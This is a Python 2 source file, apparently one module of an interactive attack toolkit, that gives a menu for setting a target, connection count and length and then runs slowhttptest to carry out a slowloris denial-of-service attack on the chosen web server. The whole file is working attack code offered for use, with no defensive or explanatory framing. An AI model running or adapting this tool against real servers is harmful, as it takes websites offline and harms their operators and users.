from core import *

class HTTP(object):
    def __init__(self, command):
        self.command = command
    
    def slowloris(self):
        while True:
            command = raw_input(LP + "[http] slowloris >> " + W)    
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "target":
                    ip = "http://"+ tokenized[1]
                    print "Target IP => ", ip
                    continue
                elif tokenized[0] == "connections":
                    socket_count = tokenized[1]
                    print "Connections => ", socket_count
                    continue
                elif tokenized[0] == "length":
                    length = tokenized[1]
                    print "Length => ", length
                    continue
                elif tokenized[0] == "start":
                    print "Target IP =>", ip, "\nConnections =>", socket_count, "\nLength =>", length
                    confirm = raw_input(LC + "[?] Is the information valid? (y/n) " + W)
                    if (confirm == "y") or (confirm == "yes"):
                        # TODO: native slowloris implementation 
                        call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                    continue
                elif tokenized[0] == "exit":
                    break
            except ValueError:
                print WARNING
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print R + "[!] Parameters were not set before execution! [!]" + W
                continue
    
    def execute(self):
        if self.command == "slowloris":
            print_command_help(slowloris_menu)
            self.slowloris()
